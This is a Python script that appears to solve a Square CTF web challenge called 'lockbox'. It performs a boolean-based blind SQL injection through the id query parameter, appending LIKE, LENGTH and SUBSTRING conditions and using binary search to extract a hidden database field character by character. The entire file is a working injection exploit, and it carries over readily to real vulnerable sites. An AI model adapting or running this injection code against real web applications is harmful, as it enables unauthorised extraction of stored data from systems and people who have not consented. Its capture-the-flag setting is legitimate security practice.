import string
import time
import requests


BASE_URL = 'https://lockbox-6ebc413cec10999c.squarectf.com/'
BASE_QUERY = 'id=3'


def id_matches(id_param):
    params = {"id": id_param}
    print("id_param=", id_param)
    res = requests.get(BASE_URL, params=params)
    time.sleep(1) # to be nice to server
    if 'record not found' in res.text:
        return False
    elif 'timelock' in res.text or 'bad hash' in res.text:
        return True
    else:
        raise RuntimeError(res.text)


def determine_charset():
    # [A-Za-z0-9_-]
    base64_charset = string.ascii_letters + string.digits + "_-"
    actual_charset = ""
    for ch in base64_charset:
        if id_matches(BASE_QUERY + f" AND `data` like '%{ch}%'"):
            actual_charset += ch
            print(f"{ch}: Y")
        else:
            print(f"{ch}: N")
    print(repr(actual_charset))
    return "".join(sorted(actual_charset))


def determine_data_length():
    def gt(n:int):
        query = BASE_QUERY + f" AND LENGTH(`data`) > {n}"
        return id_matches(query)

    def drop_gt(vals, val):
        idx = vals.index(val)
        return vals[:idx+1]
    
    def drop_lt_eq(vals, val):
        idx = vals.index(val)
        return vals[idx+1:]

    possible_lengths = list(range(0, 140 + 1))
    while len(possible_lengths) > 1:
        idx = (len(possible_lengths) // 2) - 1
        length = possible_lengths[idx]
        if gt(length):
            possible_lengths = drop_lt_eq(possible_lengths, length)
            print(f"{length} GT")
        else:
            possible_lengths = drop_gt(possible_lengths, length)
            print(f"{length} LT_EQ")
        print(possible_lengths)
    return possible_lengths[0]
    

def main():
    charset = determine_charset()
    data_len = determine_data_length()
    assert(id_matches(BASE_QUERY + f" AND `data` REGEXP '^[{charset}]+$' AND LENGTH(`data`) = {data_len}"))
    
    def gt(guess):
        query = BASE_QUERY + f" AND SUBSTRING(`data`, 1, {len(guess)}) > '{guess}'"
        return id_matches(query)

    data = ""
    for i in range(data_len):
        chs = charset[:]
        while len(chs) > 1:
            idx = (len(chs) // 2) - 1
            ch = chs[idx]
            guess = data[:i] + ch
            print("chs=", chs)
            print("guess=", guess)
            if gt(guess):
                print("gt")
                chs = chs[idx+1:]
            else:
                print("lt_eq")
                chs = chs[:idx+1]
            print("")
        data += chs[0]
        print("data=", data)
        print("")
    print(data)


if __name__ == "__main__":
    main()
